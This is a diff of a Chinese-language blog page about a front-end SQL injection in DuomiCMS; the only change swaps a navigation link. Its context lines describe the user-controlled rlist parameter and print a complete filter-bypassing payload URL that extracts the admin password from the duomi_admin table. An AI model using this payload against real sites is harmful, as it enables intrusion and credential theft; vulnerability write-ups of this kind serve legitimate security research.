@@ -14,7 +14,7 @@
 <p>可以看出注入点ids来自全局变量rlist,而rlist参数是用户可以控制的，由此造成注入。</p>
 <h4 id="三、规则绕过"><a href="#三、规则绕过" class="headerlink" title="三、规则绕过"></a>三、规则绕过</h4><p>具体绕过参考之前的文章《DedeCMS CheckSql函数绕过》。通过构造如下payload即可绕过两处规则检测：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/interface/comment/api/index.php?gid=1&amp;page=2&amp;rlist[0]=`'`.``.id, extractvalue(1, concat_ws(0x20, 0x5c,(select`password` from duomi_admin limit 1))),`'`.``.id</div></pre></td></tr></table></figure>
-</div></article></div></main><footer><div class="paginator"><a href="/2017/02/18/jieqicms_sqli/" class="prev">PREV</a><a href="/2017/01/05/pigcms_sqli/" class="next">NEXT</a></div><div data-thread-key="2017/01/16/duomicms_sqli/" data-title="DuomiCMS前台SQL注入" data-url="http://goodwaf.com/2017/01/16/duomicms_sqli/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
+</div></article></div></main><footer><div class="paginator"><a href="/2017/04/21/phpcms_file_down/" class="prev">PREV</a><a href="/2017/01/05/pigcms_sqli/" class="next">NEXT</a></div><div data-thread-key="2017/01/16/duomicms_sqli/" data-title="DuomiCMS前台SQL注入" data-url="http://goodwaf.com/2017/01/16/duomicms_sqli/" data-author-key="1" class="ds-thread"></div><script>var duoshuoQuery = {short_name:"seansun"};
 (function() {
     var ds = document.createElement('script');
     ds.type = 'text/javascript';ds.async = true;
